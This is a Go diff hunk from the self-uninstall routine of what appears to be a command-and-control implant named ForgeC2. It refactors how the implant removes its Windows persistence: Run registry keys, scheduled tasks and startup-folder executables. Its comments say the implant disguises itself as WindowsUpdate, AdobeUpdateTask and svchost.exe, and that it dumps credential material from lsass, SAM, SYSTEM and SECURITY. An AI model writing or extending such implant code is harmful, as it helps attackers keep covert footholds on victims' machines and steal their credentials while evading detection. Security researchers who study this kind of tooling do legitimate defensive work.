@@ -38,16 +38,16 @@ func uninstallSelf() (string, error) {
 	// (auto-install: WindowsUpdate/AdobeUpdateTask/svchost.exe and explicit:
 	// ForgeC2/ForgeC2Update/ForgeC2.exe) so nothing is left behind regardless
 	// of which install path was used.
-	if runtime.GOOS == "windows" {
-		for _, name := range []string{"ForgeC2", "WindowsUpdate"} {
+		if runtime.GOOS == "windows" {
+		for _, name := range []string{persistencePrefix, "WindowsUpdate"} {
 			runShell(`reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v `+name+` /f`, "cmd.exe")
 		}
-		for _, name := range []string{"ForgeC2", "ForgeC2Update", "AdobeUpdateTask"} {
+		for _, name := range []string{persistencePrefix, persistencePrefix + "Update", "AdobeUpdateTask"} {
 			runShell("schtasks /delete /tn "+name+" /f", "cmd.exe")
 		}
 		appData := os.Getenv("APPDATA")
 		startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
-		for _, name := range []string{"forgec2.exe", "svchost.exe", "ForgeC2.exe"} {
+		for _, name := range []string{"svchost.exe", persistencePrefix + ".exe"} {
 			os.Remove(filepath.Join(startupDir, name))
 		}
 		// Scrub dumped credential material (lsass.dmp / SAM / SYSTEM / SECURITY)
